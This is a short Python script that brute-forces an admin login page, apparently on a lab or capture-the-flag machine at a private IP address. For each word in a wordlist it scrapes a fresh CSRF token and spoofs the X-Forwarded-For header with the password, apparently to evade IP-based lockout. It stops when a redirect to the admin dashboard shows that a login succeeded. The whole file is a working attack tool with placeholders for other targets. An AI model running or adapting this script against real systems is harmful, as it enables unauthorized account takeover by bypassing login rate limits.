#!/usr/bin/env python3
import re
import requests

host = 'http://10.10.10.191' #ChangeMe!
login_url = host + '/admin/login' #ChangeMe!
username = 'user' #ChangeMe!
wordlist = './words.txt' #ChangeMe!

#Parse wordlist
with open(wordlist) as words:
    content = words.readlines()
    word = [x.strip() for x in content]
wordlist = word

for password in wordlist:
    session = requests.Session()
    login_page = session.get(login_url)

    #Grab csrf token from client-side webpage
    csrf_token = re.search('input.+?name="tokenCSRF".+?value="(.+?)"', login_page.text).group(1) 


    print('[*] Trying: {p}'.format(p = password))

    #Create Header
    headers = {
        'X-Forwarded-For': password,
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36',
        'Referer': login_url
    }

    #POST Data
    data = {
        'tokenCSRF': csrf_token,
        'username': username,
        'password': password,
        'save': ''
    }

    #POST and save results to login_result
    login_result = session.post(login_url, headers = headers, data = data, allow_redirects = False)

    #Parse POST result to see if access has been granted
    if 'location' in login_result.headers:
        if '/admin/dashboard' in login_result.headers['location']:
            print()
            print('Found! Use {u}:{p} to login.'.format(u = username, p = password))
            break
